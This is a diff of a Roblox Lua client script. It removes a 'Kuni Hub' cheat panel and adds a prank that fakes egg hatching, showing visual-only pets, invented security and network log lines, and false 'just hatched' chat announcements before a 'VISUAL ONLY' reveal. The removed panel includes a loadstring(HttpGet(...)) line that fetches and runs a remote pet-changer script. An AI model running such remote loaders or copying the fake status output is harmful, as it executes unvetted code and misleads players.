+	sphere.Parent = workspace
+
+	local bill = Instance.new("BillboardGui", sphere)
+	bill.Size = UDim2.fromOffset(160, 36)
+	bill.StudsOffset = Vector3.new(0, 2.4, 0)
+	bill.AlwaysOnTop = true
+	local lab = Instance.new("TextLabel", bill)
+	lab.BackgroundTransparency = 1
+	lab.Size = UDim2.fromScale(1,1)
+	lab.Font = Enum.Font.GothamBold
+	lab.TextSize = 18
+	lab.TextColor3 = Colors[rarity] or Color3.new(1,1,1)
+	lab.TextStrokeTransparency = 0.5
+	lab.Text = petName .. "  " .. rarity .. "  client"
+
+	-- idle bob
+	task.spawn(function()
+		local t = 0
+		while sphere.Parent do
+			t += task.wait()
+			sphere.CFrame = cf * CFrame.new(0, 1.5 + math.sin(t*2)*0.2, 0)
+		end
+	end)
+
+	game:GetService("Debris"):AddItem(sphere, 20)
+end
+
+-- pick rarity by weight
+local function rollRarity()
+	local total = 0
+	for _,r in ipairs(Rarities) do total += r.chance end
+	local pick = math.random() * total
+	local acc = 0
+	for _,r in ipairs(Rarities) do
+		acc += r.chance
+		if pick <= acc then
+			return r.name
+		end
+	end
+	return "Common"
+end
+
+local function animProgress(seconds)
+	fill.Size = UDim2.new(0,0,1,0)
+	local tw = TweenService:Create(fill, TweenInfo.new(seconds, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1,0,1,0)})
+	tw:Play()
+end
+
+-- reveal banner
+local revealed = false
+local function revealPrank()
+	if revealed then return end
+	revealed = true
+	title.Text = "Adrian Hatch â€¢ VISUAL ONLY"
+	log("[WARN] server mode visual only no instance created")
+	notify("pranked", "visual hatch lang walang real pet", 4)
+end
+
+-- main hatch pipeline
+local function runHatch(times)
+	times = times or 1
+	local eggType = (#eggInput.Text > 0 and eggInput.Text) or "Common Egg"
+	local targetPet = (#petInput.Text > 0 and petInput.Text) or "Kitsune"
+	local spd = string.lower(spdInput.Text)
+	local speedMult = (spd == "turbo" and 2.0) or (spd == "fast" and 1.4) or 1.0
+
+	log(string.format("[INFO] egg=%s target=%s speed=%.1fx", eggType, targetPet, speedMult))
+	log("[SEC] verifying client entitlements...")
+	task.wait(0.4); log("[OK] ui pass")
+	log("[NET] connecting hatch pipeline..."); task.wait(0.35)
+	log("[OK] route=egg/hatch v3"); task.wait(0.25)
+
+	for i=1, times do
+		log(string.format("[ROLL] sequence %d", i))
+		animProgress(0.9 / speedMult)
+		local egg = createFakeEgg()
+		crackAnimation(egg, speedMult)
+
+		-- visual roll
+		local rarity = rollRarity()
+		local char = player.Character or player.CharacterAdded:Wait()
+		local root = char:WaitForChild("HumanoidRootPart")
+		local cf = root.CFrame * CFrame.new(0, 2.2, -4)
+
+		confettiBurst(egg.Position, Colors[rarity] or Color3.new(1,1,1))
+		floatText(cf, "HATCHED  " .. string.upper(targetPet) .. "  â€¢  " .. string.upper(rarity), Colors[rarity] or Color3.new(1,1,1))
+		spawnFakePet(cf, targetPet, rarity)
+
+		sysmsg(string.format("[%s] %s just hatched %s â€¢ %s  client",
+			eggType, player.Name, targetPet, rarity))
+
+		if egg and egg.Parent then egg:Destroy() end
+		task.wait(0.25)
+	end
+
+	log("[DONE] hatch pipeline finished")
+	-- auto reveal after some time para tumawa sila late
+	task.delay(18, revealPrank)
+end
+
+hatchBtn.MouseButton1Click:Connect(function()
+	hatchBtn.Text = "HATCHING..."
+	hatchBtn.Active = false; multiBtn.Active = false
+	runHatch(1)
+	task.wait(1.0)
+	hatchBtn.Text = "HATCH EGG"; hatchBtn.Active = true; multiBtn.Active = true
 end)
 
--- Button 5: Run Pet Weight Changer
-local button5 = createButton(frame, 178, "Run Pet Weight Changer")
-button5.MouseButton1Click:Connect(function()
-    button5.Text = "Loading..."
-    button5.BackgroundTransparency = 0.5
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/petsizechanger"))()
-    end)
-    button5.Text = success and "Loaded!" or "Failed!"
-    if not success then warn("[Kuni Hub] Error: "..tostring(err)) end
-    wait(2)
-    button5.Text = "Run Pet Weight Changer"
-    button5.BackgroundTransparency = 0
+multiBtn.MouseButton1Click:Connect(function()
+	multiBtn.Text = "HATCHING x3..."
+	hatchBtn.Active = false; multiBtn.Active = false
+	runHatch(3)
+	task.wait(1.0)
+	multiBtn.Text = "HATCH x3"; hatchBtn.Active = true; multiBtn.Active = true
 end)
 
--- Minimize button
-local minBtn = Instance.new("TextButton")
-minBtn.Size = UDim2.new(0, 26, 0, 22)
-minBtn.Position = UDim2.new(1, -60, 0, 10)
-minBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-minBtn.BorderSizePixel = 0
-minBtn.Text = "â€“"
-minBtn.Font = Enum.Font.GothamBold
-minBtn.TextSize = 22
-minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-minBtn.Parent = frame
-Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)
-
-minBtn.MouseEnter:Connect(function() TweenInOut(minBtn, {BackgroundTransparency = 0.3}, 0.2) end)
-minBtn.MouseLeave:Connect(function() TweenInOut(minBtn, {BackgroundTransparency = 0}, 0.2) end)
-
-local visible = true
-minBtn.MouseButton1Click:Connect(function()
-    visible = not visible
-    button1.Visible = visible
-    button2.Visible = visible
-    button3.Visible = visible
-    button4.Visible = visible
-    footer.Visible = visible
-    minBtn.Text = visible and "â€“" or "+"
-    frame.Size = visible and UDim2.new(0, 220, 0, 226) or UDim2.new(0, 220, 0, 45)
+UserInputService.InputBegan:Connect(function(i, gpe)
+	if gpe then return end
+	if i.KeyCode == Enum.KeyCode.H then
+		revealPrank()
+	end
 end)
 
--- Exit button
-local exitBtn = Instance.new("TextButton")
-exitBtn.Size = UDim2.new(0, 26, 0, 22)
-exitBtn.Position = UDim2.new(1, -30, 0, 10)
-exitBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-exitBtn.BorderSizePixel = 0
-exitBtn.Text = "Ã—"
-exitBtn.Font = Enum.Font.GothamBold
-exitBtn.TextSize = 22
-exitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-exitBtn.Parent = frame
-Instance.new("UICorner", exitBtn).CornerRadius = UDim.new(0, 6)
-
-exitBtn.MouseEnter:Connect(function() TweenInOut(exitBtn, {BackgroundTransparency = 0.3}, 0.2) end)
-exitBtn.MouseLeave:Connect(function() TweenInOut(exitBtn, {BackgroundTransparency = 0}, 0.2) end)
-exitBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-
--- Draggable logic
-local dragging = false
-local dragStart, startPos
-
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
-    end
-end)
-
-frame.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-                                   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
--- SKIDDED BY SIGMA @rizzify101
+notify("Adrian Hatch", "loaded private build v2.4", 4)
+log("[BOOT] ui attached ok")
+log("[INFO] ready press H to reveal prank")
